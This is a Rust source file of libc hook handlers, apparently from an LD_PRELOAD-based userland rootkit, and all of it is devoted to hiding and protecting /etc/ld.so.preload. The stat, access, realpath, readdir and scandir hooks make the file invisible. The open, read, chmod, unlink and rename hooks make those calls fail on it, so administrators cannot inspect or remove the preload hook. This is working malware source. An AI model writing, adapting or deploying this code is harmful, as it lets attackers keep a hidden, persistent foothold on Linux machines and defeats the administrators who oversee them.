extern crate libc;
extern crate errno;
use libc::{c_uint, EBADF};
use libc::{c_char, c_int, ENOENT};
use errno::set_errno;
use errno::Errno;
use std::cell::RefCell;
use std::{ffi::CStr, fs};
use log::{info, warn};


pub fn handle_rename(oldpath: *const c_char, newpath: *const c_char) -> Option<c_int> {
    let old_path = unsafe { CStr::from_ptr(oldpath) };
    let new_path = unsafe { CStr::from_ptr(newpath) };

    info!("[rename] old: {:?}, new: {:?}", old_path, new_path);

    if old_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[rename] Prevented renaming of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_stat(path: *const c_char, _buf: *mut libc::stat) -> Option<c_int> {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[stat] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[stat] Hiding /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_access(path: *const c_char, mode: c_int) -> Option<c_int> {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[access] path: {:?}, mode: {}", path_str, mode);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[access] Prevented access to /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_realpath(path: *const c_char, _resolved_path: *mut c_char) -> Option<*mut c_char> {
    let path_str = unsafe { CStr::from_ptr(path) };

    info!("[realpath] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[realpath] Prevented resolution of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(std::ptr::null_mut());
    }
    None
}

pub fn handle_open(cpath: *const c_char, _oflag: c_int) -> Option<c_int> {
    let path = unsafe { CStr::from_ptr(cpath) };

    info!("[open] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[open] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_openat(dirfd: c_int, cpath: *const c_char, _oflag: c_int) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, cpath)?;
    info!("[openat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[openat] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_fopen(cpath: *const c_char, _mode: *const c_char) -> Option<*mut libc::FILE> {
    let path = unsafe { CStr::from_ptr(cpath) };
    info!("[fopen] path: {:?}", path);

    if path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fopen] Prevented opening of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(std::ptr::null_mut());
    }
    None
}

pub fn handle_read(fd: c_int, _buf: *mut libc::c_void, count: usize) -> Option<isize> {
    info!("[read] fd: {}, count: {}", fd, count);

    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).ok()?;
    if  link_path.as_os_str() == "/etc/ld.so.preload" {
        warn!("[read] Prevented reading from /etc/ld.so.preload");
        set_errno(Errno(EBADF));
        return Some(-1);
    }

    None
}

pub fn handle_chmod(path: *const c_char, _mode: libc::mode_t) -> Option<c_int> {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[chmod] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[chmod] Prevented chmod on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_fchmod(fd: c_int, _mode: libc::mode_t) -> Option<c_int> {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).ok()?;
    info!("[fchmod] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fchmod] Prevented fchmod on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return Some(-1);
    }
    None
}

pub fn handle_fchmodat(dirfd: c_int, path: *const c_char, _mode: libc::mode_t, _flags: c_int) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, path)?;
    info!("[fchmodat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fchmodat] Prevented fchmodat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_unlink(path: *const c_char) -> Option<c_int> {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[unlink] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[unlink] Prevented unlink of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_unlinkat(dirfd: c_int, path: *const c_char, _flags: c_int) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, path)?;
    info!("[unlinkat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[unlinkat] Prevented unlinkat of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_renameat(olddirfd: c_int, oldpath: *const c_char, newdirfd: c_int, newpath: *const c_char) -> Option<c_int> {
    let old_resolved = crate::resolve_fd_path(olddirfd, oldpath)?;
    let new_resolved = crate::resolve_fd_path(newdirfd, newpath)?;
    info!("[renameat] old: {:?}, new: {:?}", old_resolved, new_resolved);

    if old_resolved.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[renameat] Prevented renaming of /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_lstat(path: *const c_char, _buf: *mut libc::stat) -> Option<c_int> {
    let path_str = unsafe { CStr::from_ptr(path) };
    info!("[lstat] path: {:?}", path_str);

    if path_str.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[lstat] Hiding /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_fstat(fd: c_int, _buf: *mut libc::stat) -> Option<c_int> {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).ok()?;
    info!("[fstat] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fstat] Prevented fstat on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return Some(-1);
    }
    None
}

pub fn handle_fstatat(dirfd: c_int, path: *const c_char, _buf: *mut libc::stat, _flags: c_int) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, path)?;
    info!("[fstatat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[fstatat] Prevented fstatat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_statx(dirfd: c_int, path: *const c_char, _flags: c_int, _mask: c_uint, _buf: *mut libc::statx) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, path)?;
    info!("[statx] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[statx] Prevented statx on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_faccessat(dirfd: c_int, path: *const c_char, _mode: c_int, _flags: c_int) -> Option<c_int> {
    let resolved_path = crate::resolve_fd_path(dirfd, path)?;
    info!("[faccessat] dirfd: {}, resolved path: {:?}", dirfd, resolved_path);

    if resolved_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[faccessat] Prevented faccessat on /etc/ld.so.preload");
        set_errno(Errno(ENOENT));
        return Some(-1);
    }
    None
}

pub fn handle_pread(fd: c_int, _buf: *mut libc::c_void, _count: usize, _offset: libc::off_t) -> Option<isize> {
    let fd_path = format!("/proc/self/fd/{}", fd);
    let link_path = fs::read_link(&fd_path).ok()?;
    info!("[pread] fd: {}, resolved path: {:?}", fd, link_path);

    if link_path.to_string_lossy().contains("/etc/ld.so.preload") {
        warn!("[pread] Prevented pread on /etc/ld.so.preload");
        set_errno(Errno(libc::EBADF));
        return Some(-1);
    }
    None
}

pub fn handle_readdir(dirp: *mut libc::DIR) -> Option<*mut libc::dirent> {
    use std::ffi::CStr;
    use std::fs;

    unsafe {
        // Get the directory path from the file descriptor
        let fd = libc::dirfd(dirp);
        let fd_path = format!("/proc/self/fd/{}", fd);
        let dir_path = fs::read_link(&fd_path).ok()?;

        info!("[readdir] Directory path resolved: {:?}", dir_path);

        // Check if the directory is `/etc`
        if dir_path.as_os_str() == "/etc" {
            loop {
                let entry = libc::readdir(dirp);
                if entry.is_null() {
                    return None;
                }

                let d_name = CStr::from_ptr((*entry).d_name.as_ptr());

                if d_name.to_string_lossy() != "ld.so.preload" {
                    return Some(entry);
                } else {
                    warn!("[readdir] Skipping entry: ld.so.preload");
                }
            }
        }
    }
    None
}

thread_local! {
    static ORIGINAL_FILTER: RefCell<Option<unsafe extern "C" fn(*const libc::dirent) -> libc::c_int>> = RefCell::new(None);
}

pub fn handle_scandir(
    dir: *const c_char,
    namelist: *mut *mut *mut libc::dirent,
    filter: Option<unsafe extern "C" fn(*const libc::dirent) -> c_int>,
    compar: Option<unsafe extern "C" fn(*const libc::dirent, *const libc::dirent) -> c_int>,
) -> Option<c_int> {
    unsafe {
        let path_str = CStr::from_ptr(dir).to_string_lossy();
        info!("[scandir] Directory path: {:?}", path_str);

        // Check if the directory is `/etc`
        if path_str == "/etc" {

            pub unsafe extern "C" fn custom_filter(entry: *const libc::dirent) -> libc::c_int {
                use std::ffi::CStr;

                let d_name = unsafe { CStr::from_ptr((*entry).d_name.as_ptr()) };

                if d_name.to_string_lossy() == "ld.so.preload" {
                    warn!("[scandir] Excluding entry: ld.so.preload");
                    return 0; // Exclude `ld.so.preload`
                }

                // Call the original filter if it exists
                ORIGINAL_FILTER.with(|f| {
                    if let Some(original_filter) = *f.borrow() {
                        return unsafe { original_filter(entry) };
                    }
                    1 // Default behavior: include the entry
                })
            }

            ORIGINAL_FILTER.with(|f| *f.borrow_mut() = filter);
            let result = crate::scandir.get()(dir, namelist, Some(custom_filter), compar);
            return Some(result);
        }
    }
    None
}

